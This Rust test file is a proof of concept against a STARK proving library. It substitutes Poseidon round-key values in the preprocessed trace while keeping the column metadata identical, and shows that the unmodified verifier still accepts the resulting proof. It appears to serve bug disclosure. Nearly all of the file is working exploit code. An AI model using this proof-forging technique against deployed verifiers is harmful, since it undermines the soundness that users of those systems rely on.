//! PoC for starkware-libs/proving sharp-8.0 @
//! 9f1aa0ec0079447df64590e28235947f547e4310
//!
//! Goal: leave the Rust verifier untouched, construct a prover-side
//! PreProcessedTrace with the SAME ids/log sizes as CanonicalSmall but with
//! different Poseidon round-key values, commit/prove against that tree via the
//! public precompute API, and show verify_cairo() accepts the full STARK even
//! though tree-0 root is not the canonical CanonicalSmall root.

use std::sync::Arc;

use cairo_air::verifier::verify_cairo;
use cairo_vm::types::layout_name::LayoutName;
use stwo::core::fields::m31::M31;
use stwo::core::fri::FriConfig;
use stwo::core::poly::circle::CanonicCoset;
use stwo::core::utils::MaybeOwned;
use stwo::core::vcs::blake2_hash::Blake2sHash;
use stwo::core::vcs_lifted::blake2_merkle::Blake2sMerkleChannel;
use stwo::prover::CommitmentTreeProver;
use stwo::prover::backend::simd::SimdBackend;
use stwo::prover::mempool::BaseColumnPool;
use stwo::prover::poly::circle::PolyOps;
use stwo_cairo_common::preprocessed_columns::poseidon::PoseidonRoundKeys;
use stwo_cairo_common::preprocessed_columns::preprocessed_trace::{
    PreProcessedColumn, PreProcessedTrace, PreProcessedTraceVariant,
};
use stwo_cairo_common::preprocessed_columns::simd_prelude::{
    BaseColumn, BaseField, BitReversedOrder, CircleEvaluation, PackedM31,
};
use stwo_cairo_dev_utils::utils::get_compiled_cairo_program_path;
use stwo_cairo_dev_utils::vm_utils::{ProgramType, run_and_adapt};
use stwo_cairo_prover::prover::{
    ChannelHash, LiftingSizePolicy, ProverParameters, prove_cairo_with_precompute,
    warm_pedersen_pp_trace,
};
use stwo_cairo_prover::witness::preprocessed_trace::gen_trace;
use stwo_constraint_framework::preprocessed_columns::PreProcessedColumnId;

/// Same public column identity and size as PoseidonRoundKeys(col), but every
/// value is offset by +1 in M31. This is attacker-controlled prover data only;
/// verifier.rs and the AIR are not modified.
struct MaliciousPoseidonRoundKeys {
    inner: PoseidonRoundKeys,
}

impl MaliciousPoseidonRoundKeys {
    fn new(col: usize) -> Self {
        Self { inner: PoseidonRoundKeys::new(col) }
    }

    fn delta() -> PackedM31 {
        PackedM31::broadcast(M31::from(1u32))
    }
}

impl PreProcessedColumn for MaliciousPoseidonRoundKeys {
    fn log_size(&self) -> u32 {
        self.inner.log_size()
    }

    fn packed_at(&self, vec_row: usize) -> PackedM31 {
        self.inner.packed_at(vec_row) + Self::delta()
    }

    fn gen_column_simd(&self) -> CircleEvaluation<SimdBackend, BaseField, BitReversedOrder> {
        let malicious_data = self
            .inner
            .packed_keys
            .iter()
            .copied()
            .map(|x| x + Self::delta())
            .collect();

        CircleEvaluation::new(
            CanonicCoset::new(self.log_size()).circle_domain(),
            BaseColumn::from_simd(malicious_data),
        )
    }

    fn id(&self) -> PreProcessedColumnId {
        self.inner.id()
    }
}

#[test]
fn poc_full_stark_accepts_noncanonical_preprocessed_root() {
    // Existing Pedersen-only E2E program. It does not need Poseidon round keys,
    // isolating the trust-anchor bug from any separate AIR semantic issue.
    let compiled_program = get_compiled_cairo_program_path("test_prove_verify_pedersen_builtin");
    let input = run_and_adapt(
        &compiled_program,
        ProgramType::Json,
        LayoutName::stwo_no_ecop,
        None,
    )
    .unwrap();

    let fri_config = FriConfig::default();
    assert_eq!(fri_config.log_blowup_factor, 1);

    let lifting_log_size = 21;
    assert_eq!(PreProcessedTraceVariant::CanonicalSmall.max_log_trace_size(), 20);

    // Materialize the legitimate table first, then replace exactly one column
    // with a malicious implementation preserving its id and log_size.
    warm_pedersen_pp_trace(PreProcessedTraceVariant::CanonicalSmall);
    let mut malicious_pp = PreProcessedTrace::canonical_small();
    let malicious_col = MaliciousPoseidonRoundKeys::new(0);
    let target_id = malicious_col.id();
    let target_idx = *malicious_pp
        .column_indices
        .get(&target_id)
        .expect("poseidon round-key column missing from CanonicalSmall");

    assert_eq!(malicious_pp.columns[target_idx].id(), target_id);
    assert_eq!(malicious_pp.columns[target_idx].log_size(), malicious_col.log_size());
    malicious_pp.columns[target_idx] = Box::new(malicious_col);

    // Verifier reconstructs CanonicalSmall only for ids/log sizes.
    // Metadata remains identical after malicious value substitution.
    let canonical_metadata = PreProcessedTrace::canonical_small();
    assert_eq!(malicious_pp.ids(), canonical_metadata.ids());
    assert_eq!(malicious_pp.log_sizes(), canonical_metadata.log_sizes());

    let malicious_pp = Arc::new(malicious_pp);

    // Build a real commitment tree over the malicious preprocessed values.
    let twiddles = SimdBackend::precompute_twiddles(
        CanonicCoset::new(lifting_log_size).circle_domain().half_coset,
    );
    let pp_polys = SimdBackend::interpolate_columns(gen_trace(malicious_pp.clone()), &twiddles);
    let base_column_pool = BaseColumnPool::new();
    let malicious_tree = CommitmentTreeProver::<SimdBackend, Blake2sMerkleChannel>::new(
        pp_polys,
        fri_config.log_blowup_factor,
        &twiddles,
        false,
        lifting_log_size,
        &base_column_pool,
    );
    let malicious_root = malicious_tree.commitment.root();

    // CanonicalSmall Blake2s root pinned by sharp-8.0's own regression test.
    let canonical_root = Blake2sHash::from(
        hex::decode("068d1166c9f9f0ec247641ca391ee8396170e69343dfcacc632f9638670d2bec")
            .unwrap(),
    );
    assert_ne!(
        malicious_root, canonical_root,
        "malicious substitution must change tree-0 root"
    );

    // Proof advertises CanonicalSmall while caller-supplied precompute commits
    // to malicious values. AIR and verifier remain untouched.
    let prover_params = ProverParameters {
        channel_hash: ChannelHash::Blake2s,
        channel_salt: 0,
        fri_config,
        preprocessed_trace: PreProcessedTraceVariant::CanonicalSmall,
        store_polynomials_coefficients: false,
        include_all_preprocessed_columns: false,
        opt_n_id_to_big_components: None,
        lifting_size_policy: LiftingSizePolicy::Fixed(lifting_log_size),
    };

    let cairo_proof = prove_cairo_with_precompute::<Blake2sMerkleChannel>(
        &base_column_pool,
        &twiddles,
        malicious_pp,
        MaybeOwned::Owned(malicious_tree),
        input,
        prover_params,
    )
    .expect("malicious prover should build a full STARK");

    let proof_root = cairo_proof.extended_stark_proof.proof.commitments[0].clone();
    assert_eq!(proof_root, malicious_root);
    assert_ne!(proof_root, canonical_root);

    println!("CANONICAL_ROOT={canonical_root:?}");
    println!("PROOF_SUPPLIED_NONCANONICAL_ROOT={proof_root:?}");

    verify_cairo::<Blake2sMerkleChannel>(cairo_proof.into())
        .expect("BUG: unmodified Rust verifier accepted noncanonical PP root");

    println!("FULL_STARK_WITH_NONCANONICAL_PREPROCESSED_ROOT_ACCEPTED");
}
